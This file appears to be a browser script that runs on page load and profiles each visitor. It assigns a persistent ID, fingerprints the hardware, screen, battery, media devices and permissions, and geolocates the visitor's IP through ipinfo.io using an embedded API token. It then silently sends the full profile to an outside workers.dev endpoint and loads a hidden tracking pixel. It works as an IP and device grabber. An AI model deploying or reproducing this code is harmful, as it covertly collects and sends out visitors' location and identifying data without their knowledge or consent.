
    function generateRandomCode() {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < 5; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return result;
    }

    function getStoredItem(name) {
        return localStorage.getItem(name);
    }

    function setStoredItem(name, value) {
        localStorage.setItem(name, value);
    }

    function checkCookies() {
        document.cookie = "testcookie=true; path=/";
        const cookiesEnabled = document.cookie.indexOf("testcookie=true") !== -1;
        return cookiesEnabled ? 'Allowed' : 'Blocked';
    }

    function detectBluetooth() {
        return "bluetooth" in navigator ? 'Yes' : 'No';
    }

    async function detectMediaDevices() {
        let speakersCount = 0;
        let microphonesCount = 0;
        let cameraCount = 0;

        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            devices.forEach(device => {
                if (device.kind === 'audiooutput') {
                    speakersCount++;
                }
                if (device.kind === 'audioinput') {
                    microphonesCount++;
                }
                if (device.kind === 'videoinput') {
                    cameraCount++;
                }
            });
        } catch (e) {
            console.error('Error detecting media devices:', e);
        }

        return { speakersCount, microphonesCount, cameraCount };
    }

    function getConnectionType() {
        if (navigator.connection) {
            const connectionType = navigator.connection.type;
            return connectionType === 'wifi' ? 'WiFi' : connectionType === 'cellular' ? 'Cellular' : 'Unknown';
        }
        return 'Unknown';
    }

    function detectMouse() {
        return window.matchMedia("(pointer: coarse)").matches ? "No" : "Yes";
    }

    async function fetchIPInfo() {
    try {
        // Fetch data from the API
        const response = await fetch('https://ipinfo.io/?token=46123289608cfd');
        const fullData = await response.json(); // Received full data

        // Format the data in the desired structure
        const formattedData = `

IP: ${fullData.ip}
Hostname: ${fullData.hostname || 'Not available'}
City: ${fullData.city}
Region: ${fullData.region}
Country: ${fullData.country}
Location: ${fullData.loc}
Postal Code: ${fullData.postal}
Time Zone: ${fullData.timezone}

IP Provider_
Name: ${fullData.company?.name || 'Not available'}
Domain: ${fullData.company?.domain || 'Not available'}
Type: ${fullData.company?.type || 'Not available'}

PRIVACY_
VPN: ${fullData.privacy?.vpn ? 'Yes' : 'No'}
Proxy: ${fullData.privacy?.proxy ? 'Yes' : 'No'}
Tor: ${fullData.privacy?.tor ? 'Yes' : 'No'}
Relay: ${fullData.privacy?.relay ? 'Yes' : 'No'}
Hosting: ${fullData.privacy?.hosting ? 'Yes' : 'No'}
Service: ${fullData.privacy?.service || 'Not available'}
        `;

        return formattedData;  // Return the formatted data
    } catch (error) {
        console.error("Error fetching IP info:", error);
        return null;
    }
}

    async function sendMessageToURL(message) {
        const url = `https://t.dzire.workers.dev/?pass_weird9351047102628027252902=${encodeURIComponent(message)}`;
        try {
            await fetch(url);
        } catch (error) {
            console.error('Error sending message:', error);
        }
    }

    async function displayDeviceInfo() {
        const infoDiv = document.getElementById("deviceInfo");
        let output = "";

        let userCode = getStoredItem("userCode");
        if (!userCode) {
            userCode = generateRandomCode();
            setStoredItem("userCode", userCode);
        }

        output += `Random Code (Stored): ${userCode}\n\n`;

        let timesOpened = parseInt(getStoredItem("timesOpened") || "0");
        timesOpened++;
        setStoredItem("timesOpened", timesOpened);
        output += `Number of Times Opened: ${timesOpened}\n\n`;

        const pageRequestDate = new Date();
        output += `Page Request Date & Time: ${pageRequestDate.toLocaleString()} (Local Time)\n\n`;

        const userAgent = navigator.userAgent;
        output += `User Agent: ${userAgent}\n\n`;

        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            output += `Battery Level: ${(battery.level * 100).toFixed(0)}%\n\n`;
            output += `Charging: ${battery.charging ? "Yes" : "No"}\n\n`;
        } else {
            output += `Battery Status: Not supported\n\n`;
        }

        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        let graphicsCard = "Unknown";

        if (gl) {
            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
            if (debugInfo) {
                const graphicsCardName = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                graphicsCard = graphicsCardName || "Not available";
            }
        }
        output += `Graphics Card Name / Driver: ${graphicsCard}\n\n`;

        output += `Touchscreen: ${"ontouchstart" in window ? "Yes" : "No"}\n\n`;

        output += `Languages: ${navigator.languages.join(", ")}\n\n`;

        if (navigator.storage && navigator.storage.estimate) {
            try {
                const { quota, usage } = await navigator.storage.estimate();
                output += `Storage Quota: ${(quota / (1024 * 1024)).toFixed(2)} MB\n\n`;
                output += `Used Storage: ${(usage / (1024 * 1024)).toFixed(2)} MB\n\n`;
            } catch {
                output += `Storage Details: Not available\n\n`;
            }
        } else {
            output += `Storage API: Not supported\n\n`;
        }

        output += `Browser Outer Size: ${window.outerWidth} x ${window.outerHeight} pixels\n\n`;
        output += `Browser Inner Size: ${window.innerWidth} x ${window.innerHeight} pixels\n\n`;

        output += `Screen Orientation: ${screen.orientation.type}\n\n`;
        output += `Screen Resolution: ${screen.width} x ${screen.height} pixels\n\n`;
        output += `Aspect Ratio: ${screen.width}:${screen.height}\n\n`;
        output += `Device Pixel Ratio: ${window.devicePixelRatio}\n\n`;
        output += `Color Depth: ${screen.colorDepth}-bit\n\n`;

        output += `Do Not Track: ${navigator.doNotTrack === "1" ? "Enabled" : "Disabled"}\n\n`;

        output += `Cookies: ${checkCookies()}\n\n`;

        output += `Bluetooth Support: ${detectBluetooth()}\n\n`;

        const mediaDevices = await detectMediaDevices();
        output += `Speakers Detected: ${mediaDevices.speakersCount}\n\n`;
        output += `Microphones Detected: ${mediaDevices.microphonesCount}\n\n`;
        output += `Cameras Detected: ${mediaDevices.cameraCount}\n\n`;

        output += `Firefox Extensions Supported: ${navigator.userAgent.includes("Firefox") ? "Yes" : "No"}\n\n`;

        output += `Memory (RAM): ${navigator.deviceMemory || "Unknown"} GB\n\n`;

        output += `Number of cores in CPU: ${navigator.hardwareConcurrency || "Unknown"}\n\n`;

        try {
            const clipboardAccess = await navigator.permissions.query({ name: 'clipboard-read' });
            output += `Clipboard Access: ${clipboardAccess.state === "granted" ? "Allowed" : "Disabled"}\n\n`;
        } catch (e) {
            output += `Clipboard Access: Disabled\n\n`;
        }

        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        output += `Time Zone: UTC ${timeZone}\n\n`;

        output += `Internet Connection: ${getConnectionType()}\n\n`;

        output += `Mouse detected: ${detectMouse()}\n\n`;

        const analyticsStatus = await loadGoogleAnalyticsPixel();
output += `G Analytics Tracker Loaded: ${analyticsStatus}\n\n`;
        
        const ipInfo = await fetchIPInfo();
if (ipInfo) {
    output += `IP Information: ${ipInfo}\n\n`;  // Fixed: directly append the string without JSON.stringify
} else {
    output += `IP Information: Unable to fetch\n\n`;
}

        await sendMessageToURL(output);

        infoDiv.innerHTML = output;
    }

    function loadGoogleAnalyticsPixel() {
    return new Promise((resolve) => {
        const img = new Image(1, 1); // 1x1 pixel size
        img.src = "https://www.google-analytics.com/collect?v=1&t=event&tid=UA-000000-2&cid=555&ec=category&ea=action&el=label&ev=1";

        img.onload = () => resolve("Yes");  // Tracking allowed
        img.onerror = () => resolve("No");  // Tracking blocked

        // Positioning at the bottom
        img.style.position = "fixed";
        img.style.bottom = "0";
        img.style.left = "0";
        img.style.opacity = "0"; // Fully transparent
        img.style.pointerEvents = "none"; // Prevents interaction

        document.body.appendChild(img); // Add to the page
    });
}

    displayDeviceInfo();

